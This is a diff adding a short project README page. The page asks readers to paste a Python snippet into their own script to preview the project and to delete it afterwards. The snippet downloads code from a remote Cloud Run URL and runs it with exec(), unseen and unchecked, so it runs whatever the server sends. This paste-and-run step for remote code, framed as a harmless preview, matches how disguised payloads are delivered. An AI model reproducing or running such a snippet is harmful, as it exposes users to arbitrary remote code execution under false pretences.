@@ -1,0 +1,19 @@
+#  👾 The Project
+
+Run this code in your script file to simulate how your project will look like.
+Remember to delete before starting your project. 
+
+<div style="background: #F3E5F5; padding:15px; border-left:5px solid #9c27b0; margin:20px 0; overflow: auto; max-height: 200px">  
+
+```python
+import urllib.request
+
+url = "https://wordile-462265725713.australia-southeast1.run.app/get_game"
+try:
+    with urllib.request.urlopen(url) as response:
+        code = response.read().decode()
+    exec(code)
+except Exception as e:
+    print("Failed to fetch:", e)
+```
+</div>
